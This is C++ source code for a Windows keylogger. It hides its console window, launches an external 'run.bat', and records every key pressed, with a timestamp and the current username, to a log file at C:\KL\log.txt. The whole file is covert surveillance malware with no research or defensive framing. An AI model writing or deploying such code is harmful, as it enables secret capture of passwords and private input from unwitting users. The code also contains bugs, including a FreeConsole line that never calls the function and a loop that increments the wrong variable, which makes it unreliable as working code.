#include <iostream>
#include <ctime>
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>
#define FILE_NAME "C:\\KL\\log.txt"


using namespace std;



int main() {

    FreeConsole;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    system("run.bat");
    FILE* file = fopen(FILE_NAME, "w");
    
    unsigned char ch;

    while (true) {
        for ( ch = 0; ch <= 255; ch++) {
            for (int i = 0; i <= 5000; ch++)
            {

                if (i == 5000)
                {
                    if (GetAsyncKeyState(ch) == -32767)
                    {
                        file = fopen(FILE_NAME, "a");
                        time_t now = time(nullptr);
                        TCHAR username[UNLEN + 1];
                        DWORD username_len = UNLEN + 1;
                        GetUserName(username, &username_len);
                        HKL KeyboardLayout = 0;
                        KeyboardLayout = GetKeyboardLayout(0);
                        fwprintf(file, L"%d %jd %s uuid\n", ch, (intmax_t)now, username);
                        fclose(file);
                        i++;
                        ShowWindow(GetConsoleWindow(), SW_HIDE);
                        system("run.bat");
                        FILE* file = fopen(FILE_NAME, "w");
                    }
                }
                else
                {
                    if (GetAsyncKeyState(ch) == -32767)
                    {
                        file = fopen(FILE_NAME, "a");
                        time_t now = time(nullptr);
                        TCHAR username [UNLEN + 1];
                        DWORD username_len = UNLEN + 1;
                        GetUserName(username, &username_len);
                        HKL KeyboardLayout = 0;
                        KeyboardLayout = GetKeyboardLayout(0);
                        fwprintf(file, L"%d %jd %s uuid\n", ch, (intmax_t)now, username);
                        fclose(file);
                        i++;
                    }
                }
            }
        }
    }
    return 0;
}
